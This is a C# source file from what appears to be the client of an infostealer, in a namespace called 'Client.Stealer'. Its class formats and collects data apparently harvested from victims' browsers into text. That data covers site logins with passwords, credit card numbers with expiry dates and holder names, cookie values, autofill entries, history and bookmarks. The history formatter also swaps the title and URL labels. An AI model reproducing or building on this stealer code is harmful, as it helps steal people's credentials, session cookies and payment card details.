using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;

namespace Client.Stealer
{
    internal sealed class cBrowserUtils
    {
        private static string FormatPassword(Password pPassword)
        {
            return String.Format("Url: \t{0}\r\nUsername: \t{1}\r\nPassword: \t{2}\r\n\r\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
        }
        private static string FormatCreditCard(CreditCard cCard)
        {
            return String.Format("Type: \t{0}\r\nNumber: \t{1}\r\nExp: \t{2}\r\nHolder: \t{3}\r\n\r\n", 
                Banking.DetectCreditCardType(cCard.sNumber), cCard.sNumber, cCard.sExpMonth + "/" + cCard.sExpYear, cCard.sName);
        }
        private static string FormatCookie(Cookie cCookie)
        {
            return String.Format("Key:\t{0}\r\nPath:\t{1}\r\nExpireUtc:\t{2}\r\nName:\t{3}\r\nValue:\t{4}\r\n", 
                cCookie.sHostKey, cCookie.sPath, cCookie.sExpiresUtc, cCookie.sName, cCookie.sValue);
        }
        private static string FormatAutoFill(AutoFill aFill)
        {
            return String.Format("Name:\t{0}\r\nValue:\t{1}\r\n\r\n", aFill.sName, aFill.sValue);
        }
        private static string FormatHistory(Site sSite)
        {
            return String.Format("Title: \t{1}\r\nUrl: \t{0}\r\nCount:\t{2}\r\n", 
                sSite.sTitle, sSite.sUrl, sSite.iCount);
        }
        private static string FormatBookmark(Bookmark bBookmark)
        {
            if (!string.IsNullOrEmpty(bBookmark.sUrl))
                return String.Format("Title: \t{0}\r\nUrl: \t{1}\r\n", bBookmark.sTitle, bBookmark.sUrl);
            else
                return String.Format("Title: \t{0}\r\n", bBookmark.sTitle);
        }

        public static bool WriteCookies(List<Cookie> cCookies, StringBuilder builder)
        {
            foreach (Cookie cCookie in cCookies)
            {
                string cookiestr = FormatCookie(cCookie);
                builder.Append(cookiestr);
            }
            return true;
        }

        public static bool WriteAutoFill(List<AutoFill> aFills, StringBuilder builder)
        {
            foreach (AutoFill aFill in aFills) {
                string autostr = FormatAutoFill(aFill);
                builder.Append(autostr);
            }
            return true;
        }

        public static bool WriteHistory(List<Site> sHistory, StringBuilder builder)
        {
            foreach (Site sSite in sHistory)
            {
                string histstr = FormatHistory(sSite);
                builder.Append(histstr);
            }
            return true;
        }

        public static bool WriteBookmarks(List<Bookmark> bBookmarks, StringBuilder builder)
        {
            foreach (Bookmark bBookmark in bBookmarks)
            {
                string bmarkstr = FormatBookmark(bBookmark);
                builder.Append(bmarkstr);
            }
            return true;
        }

        public static bool WritePasswords(List<Password> pPasswords, StringBuilder builder)
        {
            foreach (Password pPassword in pPasswords)
            {
                if (pPassword.sUsername == "" || pPassword.sPassword == "")
                    continue;
                string passstr = FormatPassword(pPassword);
                builder.Append(passstr);
            }
            return true;
        }

        public static bool WriteCreditCards(List<CreditCard> cCC, StringBuilder builder)
        {
            foreach (CreditCard aCC in cCC)
            {
                string ccstr = FormatCreditCard(aCC);
                builder.Append(ccstr);
            }
            return true;
        }
    }
}

